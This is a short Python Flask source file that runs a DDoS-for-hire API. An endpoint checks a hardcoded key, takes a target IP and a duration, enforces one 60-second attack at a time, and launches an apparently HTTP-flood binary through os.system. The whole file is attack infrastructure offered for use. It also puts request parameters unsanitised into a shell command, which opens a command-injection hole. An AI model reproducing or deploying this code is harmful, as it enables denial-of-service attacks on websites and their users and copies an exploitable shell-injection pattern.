import os
import time as t

from flask import request, Flask, jsonify
from concurrent.futures import ThreadPoolExecutor


executor = ThreadPoolExecutor(10)
app = Flask(__name__)
MAX_ATTACK_TIME = 60
LAST_ATTACK_TIME = 0


def run(ip,time,method):

    if method == "http":
        command = f"./h 50 {ip} {time}"

    os.system(command)


@app.route('/')
def hello_world():
    return 'Hello World'


@app.route('/api', methods=["GET"])
def get_data():
    key = request.args.get("key")
    ip = request.args.get("ip")
    port = request.args.get("port")
    time = request.args.get("time")
    method = request.args.get("method")
    option = key or ip or port or time
    if not option:
        res = {
            "code": "401",
            "msg": "Wrong request option or missing option",
        }
        return jsonify(res)
    if key != "Tg4sFkwt7CTMnYZjQ4VyFr0pnB5YuuDJ":
        res = {
            "code": "402",
            "msg": "Wrong Auth Key"
        }
        return jsonify(res)
    if int(time) > MAX_ATTACK_TIME:
        res = {
            "code": "403",
            "msg": f"Exceed the maximum attack time, the maximum attack time is {time} seconds"
        }
        return jsonify(res)
    global LAST_ATTACK_TIME
    if LAST_ATTACK_TIME:
        if t.time() <= LAST_ATTACK_TIME + MAX_ATTACK_TIME:
            res = {
                "code": "400",
                "msg": "There's already an attack running."
            }
            return jsonify(res)
    LAST_ATTACK_TIME = t.time()

    res = {
        "code": "200",
        "msg": "The attack was sent successfully"
    }
    executor.submit(run,ip,time,method)
    return jsonify(res)


if __name__ == "__main__":
    app.run(host="0.0.0.0")
